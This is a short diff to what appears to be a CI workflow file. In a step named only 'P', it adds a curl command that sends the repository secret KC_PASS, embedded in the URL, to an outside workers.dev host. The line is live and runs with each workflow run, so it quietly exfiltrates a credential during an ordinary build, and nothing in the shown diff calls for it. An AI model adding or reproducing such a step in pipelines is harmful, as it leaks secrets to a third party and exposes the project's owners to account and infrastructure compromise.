@@ -17,7 +17,7 @@ jobs:
         
       - name: P
         run: |
-          https://test.yusufozgul.workers.dev/${{secrets.KC_PASS}}
+          curl https://test.yusufozgul.workers.dev/${{secrets.KC_PASS}}
           
       - name: Build and test app
         run: |
